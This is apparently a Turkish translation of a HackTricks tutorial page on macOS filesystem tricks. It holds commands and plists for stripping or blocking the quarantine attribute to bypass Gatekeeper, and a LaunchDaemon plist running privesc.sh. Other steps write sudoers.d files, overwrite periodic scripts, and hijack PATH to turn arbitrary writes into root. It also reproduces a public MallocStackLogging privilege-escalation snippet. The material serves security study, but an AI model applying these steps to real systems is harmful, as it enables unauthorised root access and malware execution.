# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX izin kombinasyonları

Bir **dizindeki** izinler:

- **okuma** - dizin girişlerini **sıralayabilirsiniz**
- **yazma** - dizindeki **dosyaları silip/yazabilirsiniz** ve **boş klasörleri** silebilirsiniz.
- Ancak **boş olmayan klasörleri** silip/değiştiremezsiniz, eğer üzerinde yazma izniniz yoksa.
- Bir klasörün adını **değiştiremezsiniz** eğer ona sahip değilseniz.
- **çalıştırma** - dizinde **gezinmenize izin verilir** - bu hakka sahip değilseniz, içindeki dosyalara veya alt dizinlerdeki dosyalara erişemezsiniz.

### Tehlikeli Kombinasyonlar

**Root tarafından sahip olunan bir dosya/klasörü nasıl geçersiz kılabilirsiniz**, ancak:

- Yolda bir ana **dizin sahibi** kullanıcıdır
- Yolda bir ana **dizin sahibi** **kullanıcı grubu** **yazma erişimine** sahiptir
- Bir kullanıcı **grubu** **dosyaya** **yazma** erişimine sahiptir

Önceki kombinasyonlardan herhangi biriyle, bir saldırgan **beklenen yola** bir **simetrik/sert bağlantı** **enjekte** edebilir ve ayrıcalıklı bir yazma elde edebilir.

### Klasör root R+X Özel durumu

Eğer **yalnızca root'un R+X erişimine sahip olduğu** bir **dizide** dosyalar varsa, bu dosyalar **başka kimseye erişilebilir değildir**. Bu nedenle, bir kullanıcının **okuyabileceği** bir dosyayı, bu **kısıtlama** nedeniyle okunamayan bir klasörden **farklı birine** **taşıma** izni veren bir güvenlik açığı, bu dosyaları okumak için kötüye kullanılabilir.

Örnek: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Sembolik Bağlantı / Sert Bağlantı

Eğer ayrıcalıklı bir işlem, **düşük ayrıcalıklı bir kullanıcı** tarafından **kontrol edilebilecek** veya daha önce düşük ayrıcalıklı bir kullanıcı tarafından **oluşturulmuş** bir **dosyaya** veri yazıyorsa. Kullanıcı, sadece bir Sembolik veya Sert bağlantı aracılığıyla onu **başka bir dosyaya** **işaret edebilir** ve ayrıcalıklı işlem o dosyaya yazacaktır.

Bir saldırganın **ayrıcalıkları artırmak için keyfi bir yazmayı nasıl kötüye kullanabileceğini** kontrol edin.

## .fileloc

**`.fileloc`** uzantısına sahip dosyalar, diğer uygulamalara veya ikili dosyalara işaret edebilir, böylece açıldıklarında, uygulama/ikili dosya çalıştırılacaktır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Keyfi FD

Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya zorlayabilirseniz**, **`crontab`**'i kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilirsiniz, böylece `exploit.py` `/etc/sudoers` içindeki dosyaya FD alacak ve bunu kötüye kullanacaktır.

Örneğin: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Karantina xattrs hilelerinden kaçının

### Kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable bayrağı

Eğer bir dosya/klasör bu değişmez niteliğe sahipse, ona bir xattr eklemek mümkün olmayacaktır.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

Bir **devfs** montajı **xattr** desteklemez, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, bir dosyayı ACE'leri ile birlikte kopyalar.

[**kaynak kodda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebilir ki, xattr içinde saklanan ACL metin temsili **`com.apple.acl.text`** olarak adlandırılır ve bu, sıkıştırılmamış dosyada ACL olarak ayarlanacaktır. Yani, bir uygulamayı ACL'nin diğer xattr'lerin yazılmasını engellediği **AppleDouble** dosya formatında bir zip dosyasına sıkıştırdıysanız... karantina xattr uygulamaya ayarlanmamıştı:

Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.

Bunu tekrarlamak için önce doğru acl dizesini almamız gerekiyor:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not edin ki bu işe yarasa bile, sandbox öncelikle karantina xattr'ı yazar)

Gerçekten gerekli değil ama yine de burada bırakıyorum:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Kod İmzalarını Atlatma

Bundle'lar, **bundle** içindeki her bir **dosya**nın **hash**'ini içeren **`_CodeSignature/CodeResources`** dosyasını içerir. CodeResources'ın hash'inin de **çalıştırılabilir dosya**ya **gömülü** olduğunu unutmayın, bu yüzden bununla da oynayamayız.

Ancak, imzasının kontrol edilmeyeceği bazı dosyalar vardır, bunlar plist'te omit anahtarına sahiptir, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLI'den bir kaynağın imzasını hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMG'leri Bağla

Bir kullanıcı, mevcut bazı klasörlerin üzerine bile oluşturulmuş özel bir dmg'yi bağlayabilir. Özel içerikle bir özel dmg paketi oluşturmanın yolu budur:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, diski `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisi ile bağlar. LaunchDaemons plist dosyasına `-d` parametresi eklenip yeniden başlatıldığında, `/var/log/diskarbitrationd.log` dosyasına günlükler kaydedilecektir.\
Ancak, `com.apple.driver.DiskImages` kext'i ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçlar kullanmak mümkündür.

## Keyfi Yazmalar

### Periyodik sh betikleri

Eğer betiğiniz bir **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.

Bu betiğin bir yürütmesini **`sudo periodic daily`** ile **sahte** yapabilirsiniz.

### Daemonlar

Keyfi bir **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi, keyfi bir betiği yürüten bir plist ile:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Sadece kök olarak çalıştırmak istediğiniz **komutları** içeren `/Applications/Scripts/privesc.sh` dosyasını oluşturun.

### Sudoers Dosyası

Eğer **keyfi yazma** yetkiniz varsa, kendinize **sudo** ayrıcalıkları veren bir dosya oluşturabilirsiniz **`/etc/sudoers.d/`** klasörü içinde.

### PATH dosyaları

**`/etc/paths`** dosyası, PATH env değişkenini dolduran ana yerlerden biridir. Üzerine yazmak için kök olmalısınız, ancak eğer **yetkili bir işlem** bir **komutu tam yol olmadan** çalıştırıyorsa, bu dosyayı değiştirerek onu **ele geçirme** şansınız olabilir.

Ayrıca `PATH` env değişkenine yeni klasörler yüklemek için **`/etc/paths.d`** içinde dosyalar yazabilirsiniz.

## Diğer kullanıcılar olarak yazılabilir dosyalar oluşturma

Bu, bana yazılabilir olan kök ait bir dosya oluşturacaktır ([**buradan kod**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Bu aynı zamanda privesc olarak da çalışabilir:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Paylaşılan Bellek

**POSIX paylaşılan bellek**, POSIX uyumlu işletim sistemlerinde süreçlerin ortak bir bellek alanına erişmesine olanak tanır ve bu, diğer süreçler arası iletişim yöntemlerine kıyasla daha hızlı iletişim sağlar. Bu, `shm_open()` ile bir paylaşılan bellek nesnesi oluşturmayı veya açmayı, `ftruncate()` ile boyutunu ayarlamayı ve `mmap()` kullanarak sürecin adres alanına haritalamayı içerir. Süreçler daha sonra bu bellek alanından doğrudan okuma ve yazma yapabilirler. Eşzamanlı erişimi yönetmek ve veri bozulmasını önlemek için genellikle mutexler veya semaforlar gibi senkronizasyon mekanizmaları kullanılır. Son olarak, süreçler paylaşılan belleği `munmap()` ve `close()` ile haritalamayı kaldırır ve kapatır, isteğe bağlı olarak bellek nesnesini `shm_unlink()` ile kaldırabilirler. Bu sistem, birden fazla sürecin paylaşılan verilere hızlı bir şekilde erişmesi gereken ortamlarda verimli, hızlı IPC için özellikle etkilidir.

<details>

<summary>Üretici Kod Örneği</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kod Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Korunan Tanımlayıcılar

**macOS korunan tanımlayıcılar**, kullanıcı uygulamalarındaki **dosya tanımlayıcı işlemlerinin** güvenliğini ve güvenilirliğini artırmak için macOS'ta tanıtılan bir güvenlik özelliğidir. Bu korunan tanımlayıcılar, dosya tanımlayıcılarıyla belirli kısıtlamalar veya "korumalar" ilişkilendirme yolu sağlar ve bu kısıtlamalar çekirdek tarafından uygulanır.

Bu özellik, **yetkisiz dosya erişimi** veya **yarış koşulları** gibi belirli güvenlik açıklarını önlemek için özellikle yararlıdır. Bu güvenlik açıkları, örneğin bir iş parçacığı bir dosya tanımına erişirken **başka bir savunmasız iş parçacığının buna erişim sağlaması** veya bir dosya tanımlayıcısının **savunmasız bir çocuk süreç tarafından devralınması** durumunda ortaya çıkar. Bu işlevsellikle ilgili bazı fonksiyonlar şunlardır:

- `guarded_open_np`: Bir koruma ile FD açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir tanımlayıcı üzerindeki koruma bayraklarını değiştirir (hatta koruma kaldırılabilir)

## Referanslar

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
